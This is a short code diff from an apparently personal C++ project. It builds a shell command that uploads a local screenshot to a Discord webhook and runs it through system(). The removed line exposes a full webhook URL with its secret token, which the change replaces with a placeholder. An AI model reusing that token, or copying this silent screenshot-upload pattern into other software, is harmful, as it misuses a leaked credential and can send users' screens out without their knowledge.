@@ -41,6 +41,6 @@ int main()
 	fi.close();
 	std::this_thread::sleep_for(std::chrono::milliseconds(40));
 
-	string command = cmd_2 + "W:\\Code\\RandomProjects\\Screenshot.png" + "\" " + "https://discord.com/api/webhooks/1177553043554836541/UOn1bPV16aZeI5QW55qrNVbtFvrHYOQpRGL9eLNAo1QkOv7X1upMgS__CWVzc_ipbOvt";
+	string command = cmd_2 + "W:\\Code\\RandomProjects\\Screenshot.png" + "\" " + "webhook-url";
 	system(command.c_str());
 }
